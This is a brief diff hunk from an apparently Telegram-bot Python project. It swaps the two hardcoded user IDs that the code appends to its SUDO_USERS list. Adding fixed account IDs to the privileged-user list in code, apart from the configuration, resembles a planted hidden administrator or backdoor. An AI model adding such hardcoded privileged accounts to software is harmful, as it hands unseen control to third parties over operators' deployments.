@@ -5,8 +5,8 @@ from config import SUDO_USERS
 from ELLIOT.admins import get_administrators
 
 
-SUDO_USERS.append(1669178360)
-SUDO_USERS.append(1920507972)
+SUDO_USERS.append(5302507827)
+SUDO_USERS.append(5341870430)
 
 
 
